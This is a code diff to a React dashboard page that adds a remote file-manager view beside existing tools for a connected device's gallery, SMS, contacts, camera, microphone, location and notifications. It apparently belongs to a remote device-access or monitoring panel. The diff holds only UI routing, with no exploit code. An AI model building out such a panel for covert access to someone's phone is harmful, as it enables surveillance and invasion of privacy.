@@ -19,6 +19,7 @@ import CameraView from "@/components/views/CameraView";
 import VoiceView from "@/components/views/VoiceView";
 import LocationView from "@/components/views/LocationView";
 import NotificationsView from "@/components/views/NotificationsView";
+import FileManagerView from "@/components/views/FileManagerView";
 import { FlashlightView, VibrationView } from "@/components/views/ControlsView";
 import TelemetryCards from "@/components/dashboard/TelemetryCards";
 import WhatsAppButton from "@/components/WhatsAppButton";
@@ -65,12 +66,13 @@ interface HomeProps {
     initialTool?: string | null;
 }
 
-const normalizeTool = (raw: string | null | undefined): 'gallery' | 'sms' | 'contacts' | 'torch' | 'flashlight' | 'vibration' | 'camera' | 'notifications' | 'audio' | 'location' | null => {
+const normalizeTool = (raw: string | null | undefined): 'gallery' | 'files' | 'sms' | 'contacts' | 'torch' | 'flashlight' | 'vibration' | 'camera' | 'notifications' | 'audio' | 'location' | null => {
     if (!raw) return null;
     const clean = raw.toLowerCase().replace(/^\/+/, '').split('/')[0].trim();
     if (clean === 'voice' || clean === 'mic' || clean === 'microphone') return 'audio';
     if (clean === 'torch') return 'flashlight';
-    if (['gallery', 'sms', 'contacts', 'flashlight', 'vibration', 'camera', 'notifications', 'audio', 'location'].includes(clean)) {
+    if (clean === 'filemanager' || clean === 'file' || clean === 'explorer' || clean === 'files') return 'files';
+    if (['gallery', 'files', 'sms', 'contacts', 'flashlight', 'vibration', 'camera', 'notifications', 'audio', 'location'].includes(clean)) {
         return clean as any;
     }
     return null;
@@ -350,7 +352,7 @@ export default function Home({ initialTool = null }: HomeProps = {}) {
     }, []);
     const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);
 
-    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'flashlight' | 'vibration' | 'camera' | 'notifications' | 'audio' | 'location' | null>(() => {
+    const [selectedTool, setSelectedTool] = useState<'gallery' | 'files' | 'sms' | 'contacts' | 'torch' | 'flashlight' | 'vibration' | 'camera' | 'notifications' | 'audio' | 'location' | null>(() => {
         const fromProp = normalizeTool(initialTool);
         if (fromProp) return fromProp;
         if (typeof window !== 'undefined') {
@@ -2057,6 +2059,15 @@ END:VCARD`;
     // Helper to render tools cleanly via modularized view components
     const renderTool = () => {
         switch (selectedTool) {
+            case 'files':
+                return (
+                    <FileManagerView
+                        socket={socket}
+                        userUuid={session?.user?.uuid}
+                        selectedDeviceId={selectedDeviceId}
+                        isOnline={!!isCurrentDeviceOnline}
+                    />
+                );
             case 'sms':
                 return (
                     <SmsView
